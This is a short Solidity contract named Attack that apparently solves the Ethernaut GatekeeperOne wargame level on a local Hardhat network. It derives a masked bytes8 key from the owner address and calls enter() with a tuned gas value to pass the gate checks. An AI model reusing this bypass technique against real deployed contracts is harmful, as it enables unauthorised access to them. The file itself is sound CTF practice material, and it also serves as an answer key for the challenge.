// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Uncomment this line to use console.log
 import "./console.sol";
 import "./GatekeeperOne.sol";

contract Attack {
    // owner likewise should be changed according the account in hardhat network
    address public owner=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address public gatekeeper;
    GatekeeperOne public gatekeeperone;
    bytes8 gatekey;
    constructor(address _gatekeeper) {
       
       gatekeeperone=GatekeeperOne(_gatekeeper);
    }

    

//In Solidity, explicit type conversion is not allowed from address to bytes8,
// as address is a 20-byte (160-bit) value, while bytes8 is an 8-byte (64-bit) value.


    function attack() external{
       bytes8 key = bytes8(uint64(uint160(address(owner)))) & 0xFFFFFFFF0000FFFF;
       gatekeeperone.enter{gas:803144}(key);
}




}